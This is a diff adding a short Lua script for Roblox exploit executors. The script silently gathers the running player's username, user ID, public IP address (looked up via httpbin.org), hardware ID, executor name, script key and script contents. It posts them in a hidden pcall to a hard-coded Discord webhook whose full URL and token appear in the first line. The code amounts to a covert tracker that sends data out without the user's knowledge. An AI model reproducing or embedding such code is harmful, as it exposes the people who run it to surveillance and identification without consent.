@@ -1,0 +1,52 @@
+local a = "https://discord.com/api/webhooks/1283679695212249151/lxPQpfryEuBskO5BCN1fjHWrWid3tJq_v2KDxeRLkjr3UUJL8X7eq_-V9yHBYFQwO4pP"
+local b = game:GetService("HttpService")
+local c = http_request or request or syn.request
+local d = c({Url = "https://httpbin.org/get", Method = "GET"})
+local e = d.Body
+local f = b:JSONDecode(e)
+local g = f.origin
+local h = game.PlaceId
+local i = game.JobId
+
+local j = {
+    embeds = {
+        {
+            title = "New Execute",
+            type = "rich",
+            color = tonumber("1cff1a", 16),
+            thumbnail = {url = "https://giffiles.alphacoders.com/221/221258.gif"},
+            fields = {
+                {
+                    name = "Username / UserId",
+                    value = string.format("```%s / %d```", game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId),
+                    inline = false
+                },
+                {name = "Internet Protocol", value = string.format("```%s```", tostring(g)), inline = true},
+                {name = "Executor", value = "```" .. identifyexecutor() .. "```", inline = true},
+                {name = "Hardware ID", value = string.format("```" .. gethwid() .. "```"), inline = false},
+                {name = "Key", value = string.format("```" .. script_key .. "```"), inline = false},
+                {name = "Script", value = string.format("```" .. _G.Script .. "```"), inline = false},
+                {name = "JobId", value = string.format("```%s```", i), inline = false},
+                {
+                    name = "Profile Link",
+                    value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", game.Players.LocalPlayer.UserId),
+                    inline = true
+                },
+                {
+                    name = "Game Link",
+                    value = string.format("[Click Here](https://www.roblox.com/games/%d)", h),
+                    inline = true
+                }
+            }
+        }
+    }
+}
+
+local k = b:JSONEncode(j)
+local l = {["Content-Type"] = "application/json"}
+local m, n =
+    pcall(
+    function()
+        c({Url = a, Body = k, Method = "POST", Headers = l})
+    end
+)
